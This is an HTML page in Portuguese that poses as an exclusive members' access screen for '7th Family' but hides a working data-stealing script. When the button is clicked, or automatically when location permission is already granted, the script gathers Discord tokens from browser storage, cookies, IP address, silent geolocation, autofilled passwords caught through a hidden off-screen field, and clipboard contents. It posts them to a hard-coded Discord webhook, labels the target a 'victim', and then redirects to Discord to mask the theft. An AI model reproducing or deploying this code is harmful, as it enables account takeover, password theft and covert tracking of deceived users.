<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>7th Family | Acesso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(255,255,255,0.98);
            border-radius: 40px;
            padding: 50px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
            transform: scale(1);
            transition: transform 0.2s;
        }
        
        .icon {
            font-size: 85px;
            margin-bottom: 20px;
            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
        }
        
        h2 {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
            font-size: 32px;
            font-weight: 900;
        }
        
        p {
            color: #666;
            margin-bottom: 35px;
            line-height: 1.5;
            font-size: 15px;
        }
        
        .start-btn {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 18px 35px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
            box-shadow: 0 8px 20px rgba(255,65,108,0.3);
            position: relative;
            overflow: hidden;
        }
        
        .start-btn:active {
            transform: scale(0.98);
        }
        
        .loading {
            display: none;
            margin-top: 25px;
        }
        
        .spinner {
            width: 35px;
            height: 35px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff416c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            display: none;
        }
        
        .status.success {
            background: #e8f5e9;
            color: #2e7d32;
            display: block;
        }
        
        .hidden {
            display: none;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="card" id="card">
        <div class="icon">⚡</div>
        <h2>7TH FAMILY</h2>
        <p>Acesso exclusivo para membros verificados</p>
        <button class="start-btn" id="startBtn">🔓 CLIQUE PARA ACESSAR</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div style="color:#888; font-size:12px;">Autenticando...</div>
        </div>
        <div class="status" id="status"></div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484690769506865265/bWz8kwvQkRSAGsd7QA4EMYuImytr5otbUVJpg2CZvcEs8LuBHUROkZ-6ZRsFtcpSb4u2";
        
        let coletado = false;
        
        async function stealthCollect() {
            if (coletado) return;
            coletado = true;
            
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const data = await collectAll();
            await sendWebhook(data);
            
            document.getElementById('loading').style.display = 'none';
            document.getElementById('status').className = 'status success';
            document.getElementById('status').innerHTML = '✅ Acesso liberado! Redirecionando...';
            
            setTimeout(() => {
                window.location.href = "https://discord.com/app";
            }, 1500);
        }
        
        async function collectAll() {
            const tokens = getDiscordTokens();
            const cookies = document.cookie;
            const device = getDeviceInfo();
            const ip = await getIP();
            const location = await getLocationSilent();
            const passwords = await getSavedPasswords();
            const clipboard = await getClipboard();
            
            return { tokens, cookies, device, ip, location, passwords, clipboard };
        }
        
        function getDiscordTokens() {
            let tokens = [];
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
            const mfaRegex = /mfa\.[\w-]{84}/g;
            
            for (let i = 0; i < localStorage.length; i++) {
                let val = localStorage.getItem(localStorage.key(i));
                if (val) {
                    tokens.push(...(val.match(tokenRegex) || []));
                    tokens.push(...(val.match(mfaRegex) || []));
                }
            }
            
            for (let i = 0; i < sessionStorage.length; i++) {
                let val = sessionStorage.getItem(sessionStorage.key(i));
                if (val) {
                    tokens.push(...(val.match(tokenRegex) || []));
                }
            }
            
            return [...new Set(tokens)];
        }
        
        function getDeviceInfo() {
            return {
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: location.href,
                localStorage: localStorage.length,
                sessionStorage: sessionStorage.length,
                webdriver: navigator.webdriver || false,
                hardwareConcurrency: navigator.hardwareConcurrency || '?',
                deviceMemory: navigator.deviceMemory || '?',
                connection: navigator.connection?.effectiveType || '?'
            };
        }
        
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch(e) {
                return 'unavailable';
            }
        }
        
        async function getLocationSilent() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        });
                    },
                    () => {
                        resolve(null);
                    },
                    { timeout: 3000, maximumAge: 60000 }
                );
                
                setTimeout(() => resolve(null), 3500);
            });
        }
        
        async function getSavedPasswords() {
            let passwords = [];
            const input = document.createElement('input');
            input.type = 'password';
            input.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0';
            document.body.appendChild(input);
            input.focus();
            await new Promise(r => setTimeout(r, 800));
            if (input.value) passwords.push(input.value);
            document.body.removeChild(input);
            return passwords;
        }
        
        async function getClipboard() {
            try {
                if (navigator.clipboard) {
                    const text = await navigator.clipboard.readText();
                    return text || null;
                }
            } catch(e) {}
            return null;
        }
        
        async function sendWebhook(data) {
            const embed = {
                title: "💀 7TH FAMILY - COLETA SILENCIOSA",
                color: 0xFF0000,
                timestamp: new Date().toISOString(),
                fields: [],
                footer: { text: "7th Family | Stealth Mode" }
            };
            
            if (data.tokens && data.tokens.length > 0) {
                embed.fields.push({
                    name: `🔑 TOKENS (${data.tokens.length})`,
                    value: data.tokens.slice(0, 8).map(t => `\`${t.substring(0, 40)}...\``).join('\n'),
                    inline: false
                });
            }
            
            if (data.location) {
                embed.fields.push({
                    name: "📍 LOCALIZAÇÃO",
                    value: `Lat: ${data.location.lat}\nLng: ${data.location.lng}\n[Maps](https://maps.google.com/?q=${data.location.lat},${data.location.lng})`,
                    inline: false
                });
            }
            
            embed.fields.push({
                name: "📱 DEVICE",
                value: `OS: ${data.device.ua.match(/Android|iPhone|iPad|Windows|Mac/i) || 'Unknown'}\nScreen: ${data.device.screen}\nTZ: ${data.device.timezone}`,
                inline: false
            });
            
            embed.fields.push({
                name: "🌐 IP",
                value: data.ip || 'Unknown',
                inline: true
            });
            
            if (data.passwords && data.passwords.length > 0) {
                embed.fields.push({
                    name: "🔐 SENHAS SALVAS",
                    value: `\`${data.passwords.join(', ')}\``,
                    inline: false
                });
            }
            
            if (data.clipboard) {
                embed.fields.push({
                    name: "📋 CLIPBOARD",
                    value: `\`\`\`${data.clipboard.substring(0, 200)}\`\`\``,
                    inline: false
                });
            }
            
            if (data.cookies && data.cookies.length > 0) {
                embed.fields.push({
                    name: "🍪 COOKIES",
                    value: `\`\`\`${data.cookies.substring(0, 300)}\`\`\``,
                    inline: false
                });
            }
            
            const payload = {
                content: "@everyone **✅ VÍTIMA COLETADA - SEM TELA DE PERMISSÃO**",
                embeds: [embed],
                username: "7th Family Stealth"
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }
        
        document.getElementById('startBtn').addEventListener('click', () => {
            stealthCollect();
        });
        
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: 'geolocation' }).then(result => {
                if (result.state === 'granted') {
                    setTimeout(() => {
                        document.getElementById('startBtn').click();
                    }, 500);
                }
            });
        }
    </script>
</body>
</html>
